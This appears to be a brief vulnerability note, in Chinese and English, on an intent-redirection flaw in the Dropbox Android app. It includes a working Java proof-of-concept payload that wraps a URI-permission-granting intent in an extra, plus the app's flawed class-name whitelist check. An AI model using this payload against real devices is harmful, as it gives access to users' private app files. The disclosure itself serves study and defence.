# 组件-Dropbox
对某些缓存文件 获得 读/写权限 以及其他次要信息（前提是攻击者知道文件的名字）
原因在于 未验证传入的Intent包名 导致恶意应用程序伪装成受新人的 Android Activity

'''payload
Intent next = new Intent();
next.setClassName(getPackageName(),"com.dropbox.android.activity.CameraUploadSettingsActivity");
next.setData(Uri.parse("content://com.dropbox.android.LocalFile/smth"));
next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
			| Intent.FLAG_GRANT_WRITE_URI_PERMISSION
            | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
            | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
Intent intent = new Intent();
intent.setClassName("com.dropbox.android","com.dropbox.android.activity.LoginOrNewAcctActivity");
intent.putExtra("com.dropbox.activity.extra.NEXT_INTENT", next);
startActivity(intent);
'''

and way able to get access to providers which are android:exported="false" but android:grantUriPermissions="true" of Dropbox app. App had a white-list of allowed activities and performed the check by the following way:

'''
    public static boolean a(Intent intent) {
        ComponentName component = intent.getComponent();
        if (component == null) {
            return false;
        }
        String className = component.getClassName();
        for (Object equals : F) {
            if (className.equals(equals)) {
                return true;
            }
        }
        return false;
    }
'''